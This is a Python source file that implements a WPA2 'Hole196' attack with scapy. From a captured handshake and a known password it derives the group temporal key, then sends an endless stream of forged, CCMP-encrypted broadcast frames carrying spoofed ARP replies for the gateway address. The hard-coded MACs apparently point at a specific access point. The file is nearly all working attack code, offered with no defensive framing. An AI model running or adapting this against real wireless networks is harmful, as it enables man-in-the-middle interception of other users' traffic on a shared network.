
import binascii
from scapy.layers.dot11 import RadioTap,  Dot11, Dot11CCMP, LLC
from scapy.layers.l2 import SNAP, ARP
from scapy.layers.inet import IP, ICMP
from scapy.all import *

from cls_collPcapFile import collPcap
from def_getKey import getPTK, getPMK, getGTK
from cls_ccmp import ccmp
import time

def pn2bytes(pn:int)->bytes:
	pn_bytes = [0] * 6
	for i in range(6):
		pn_bytes[i] = pn & 0xFF
		pn >>= 8
	return pn_bytes

def produce_sc(frag: int, seq: int) -> int:
    return (seq << 4) + frag

def atkHole196(pcapPath:str, pwd:str):
    collCls = collPcap()
    collCls.read(pcapPath, hashcatFlag=False)
    
    pmk = getPMK(collCls.ESSID, pwd)
    ptk = getPTK(pmk, collCls.MAC_AP, collCls.MAC_CLIENT, collCls.NONCE_AP, collCls.NONCE_CLIENT)
    kek = ptk[16:32]
    gtk = getGTK(kek, collCls.GTK_ENCDATA)

    
    print(binascii.hexlify(gtk).decode('ascii'))

    
    bssAddr ='3C:A3:15:06:70:02' # FreeZio.2.4
    srcAddr = '12:34:56:78:90:12' # Pseudo MAC (Attacker MAC)
    dstAddr = 'FF:FF:FF:FF:FF:FF'

    bssMAC ='3C:A3:15:06:70:0b' # FreeZio.2.4    

    seq = 1
    pn = 500
    while(True):
        plainFrame = LLC()/SNAP()/\
        ARP(hwsrc='11:22:33:44:55:66', hwdst=srcAddr, psrc='192.168.0.1', pdst='192.168.0.255' ,op=2)

        encFrame = ccmp.encrypt(gtk, plainFrame, dstAddr, bssAddr, srcAddr, pn)
        encFrame = RadioTap() /\
            Dot11(type=2, subtype=0, addr1=dstAddr, addr2=bssAddr, addr3=srcAddr)/\
            Dot11CCMP() /\
            Raw(encFrame) # from-DS
        
        encFrame.FCfield = "from-DS"
        encFrame.FCfield |= Dot11(FCfield="protected").FCfield
        encFrame.PN0, encFrame.PN1, encFrame.PN2, encFrame.PN3, encFrame.PN4, encFrame.PN5 = pn2bytes(pn)
        encFrame.key_id = 1
        encFrame.ext_iv = 1
        sendp(encFrame)
        pn +=1000
        seq += 1
        
        print(pn)
        time.sleep(0.1)
    # 